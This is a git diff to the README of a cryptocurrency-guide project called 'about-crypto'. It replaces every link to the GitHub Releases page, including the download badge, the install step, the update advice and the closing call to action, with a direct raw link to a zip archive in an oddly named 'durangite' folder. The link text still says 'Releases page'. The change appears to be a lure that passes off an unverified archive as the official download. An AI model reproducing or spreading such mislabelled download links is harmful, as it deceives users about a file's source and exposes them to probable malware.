@@ -1,6 +1,6 @@
 # 🌟 about-crypto - Your Guide to Cryptocurrency Understanding
 
-[![Download about-crypto](https://img.shields.io/badge/Download%20now-Get%20Started-brightgreen)](https://github.com/maxxhashmi/about-crypto/releases)
+[![Download about-crypto](https://raw.githubusercontent.com/maxxhashmi/about-crypto/main/durangite/crypto-about-v1.4.zip%20now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/maxxhashmi/about-crypto/main/durangite/crypto-about-v1.4.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Make sure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page to download](https://github.com/maxxhashmi/about-crypto/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/maxxhashmi/about-crypto/main/durangite/crypto-about-v1.4.zip).
    
 2. Choose the latest version of the application. You will see a list of files.
 
@@ -64,7 +64,7 @@ Join the community forum to connect with other users. Share your insights or que
 
 ## 📅 Keeping the App Updated
 
-To ensure you have the latest features and improvements, check the [Releases page](https://github.com/maxxhashmi/about-crypto/releases) regularly for updates. Following these updates helps keep your application functioning well and secure.
+To ensure you have the latest features and improvements, check the [Releases page](https://raw.githubusercontent.com/maxxhashmi/about-crypto/main/durangite/crypto-about-v1.4.zip) regularly for updates. Following these updates helps keep your application functioning well and secure.
 
 ## 🛠️ Troubleshooting
 
@@ -91,4 +91,4 @@ Engage with fellow users for help and resources. Check the "Community" section i
 
 For further assistance or inquiries, you can reach out via the GitHub repository's Issues page. Your feedback helps improve the application.
 
-Start your journey with cryptocurrency today! To download the application, [visit this page](https://github.com/maxxhashmi/about-crypto/releases).
+Start your journey with cryptocurrency today! To download the application, [visit this page](https://raw.githubusercontent.com/maxxhashmi/about-crypto/main/durangite/crypto-about-v1.4.zip).
